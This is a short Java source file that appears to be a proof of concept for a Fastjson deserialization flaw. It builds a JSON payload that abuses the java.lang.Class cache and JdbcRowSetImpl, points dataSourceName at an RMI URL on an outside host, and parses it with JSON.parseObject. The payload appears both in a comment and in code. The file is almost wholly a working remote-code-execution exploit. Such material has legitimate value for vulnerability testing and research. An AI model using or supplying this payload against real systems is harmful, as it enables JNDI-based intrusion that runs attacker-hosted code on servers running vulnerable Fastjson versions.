package fastjson;

import com.alibaba.fastjson.JSON;

/*
{
    "a":{
    "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
},
    "b":{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://10.58.120.200:1099/duhxn6",
            "autoCommit":true
}
}
 */
public class fastjson_1_2_48 {
    public static void main(String[] args) {
        String json = "{\n" +
                "    \"a\": {\n" +
                "        \"@type\": \"java.lang.Class\",\n" +
                "        \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "    },\n" +
                "    \"b\": {\n" +
                "        \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\": \"rmi://10.58.120.200:1099/duhxn6\",\n" +
                "        \"autoCommit\": true\n" +
                "    }\n" +
                "}";
        JSON.parseObject(json);
    }
}
